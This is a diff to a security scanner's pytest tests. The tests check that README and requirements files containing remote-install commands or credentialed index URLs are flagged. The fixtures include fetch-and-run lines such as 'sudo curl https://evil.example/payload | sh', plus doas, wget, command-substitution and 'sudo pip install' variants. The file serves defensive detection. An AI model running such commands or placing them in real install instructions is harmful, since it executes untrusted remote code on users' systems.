@@ -276,9 +276,34 @@ def test_text_scanner_documentation_shell_substitution_remains_actionable(
 @pytest.mark.parametrize(
     "content",
     [
+        "sudo curl https://evil.example/payload | sh\n",
+        "sudo -E wget https://evil.example/payload\n",
+        "doas curl https://evil.example/payload | sh\n",
+        "echo ready; sudo curl https://evil.example/payload | sh\n",
+        "$(sudo curl https://evil.example/payload)\n",
+    ],
+)
+def test_text_scanner_privileged_documentation_downloads_remain_actionable(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
         "pip install https://evil.example/payload.whl\n",
         "python -m pip install https://evil.example/pkg.tar.gz\n",
         "py -3.11 -m pip install https://evil.example/payload.whl\n",
+        "sudo pip install https://evil.example/payload.whl\n",
         "uv pip install https://evil.example/payload.whl\n",
         "npm install https://evil.example/payload.tgz\n",
     ],
@@ -559,6 +584,8 @@ def test_text_scanner_requirements_urls_remain_actionable(tmp_path: Path) -> Non
     [
         "--index-url https://pypi.org/simple",
         "--index-url=https://pypi.org/simple",
+        "--index-url https://pypi.org/simple?format=html",
+        "--index-url https://pypi.org/simple?key=project-name",
         "--extra-index-url=https://pypi.org/simple",
         "-ihttps://pypi.org/simple",
         "--find-links=https://download.pytorch.org/whl/cpu",
@@ -587,15 +614,53 @@ def test_text_scanner_standard_requirements_urls_are_informational(
     assert determine_exit_code(aggregate) == 0
 
 
-def test_text_scanner_commented_requirements_url_is_informational(tmp_path: Path) -> None:
+@pytest.mark.parametrize(
+    "requirement_line",
+    [
+        "# --index-url https://pypi.org/simple",
+        "# --index-url http://pypi.org/simple",
+    ],
+)
+def test_text_scanner_commented_requirements_url_is_informational(
+    tmp_path: Path,
+    requirement_line: str,
+) -> None:
     text_path = tmp_path / "requirements.txt"
-    text_path.write_text("# --index-url https://pypi.org/simple\n", encoding="utf-8")
+    text_path.write_text(f"{requirement_line}\n", encoding="utf-8")
 
     result = TextScanner().scan(str(text_path))
     aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
 
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
     assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    "requirement_line",
+    [
+        "--index-url https://user:secret@pypi.org/simple",
+        "--index-url https://user@pypi.org/simple",
+        "--extra-index-url https://pypi.org/simple?token=secret-value",
+        "--find-links https://pypi.org/simple # https://user:secret@pypi.org/simple",
+        "# --index-url https://user:secret@pypi.org/simple",
+    ],
+)
+def test_text_scanner_credentialed_standard_requirements_urls_remain_actionable(
+    tmp_path: Path,
+    requirement_line: str,
+) -> None:
+    text_path = tmp_path / "requirements.txt"
+    text_path.write_text(f"{requirement_line}\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
 
 
 @pytest.mark.parametrize(
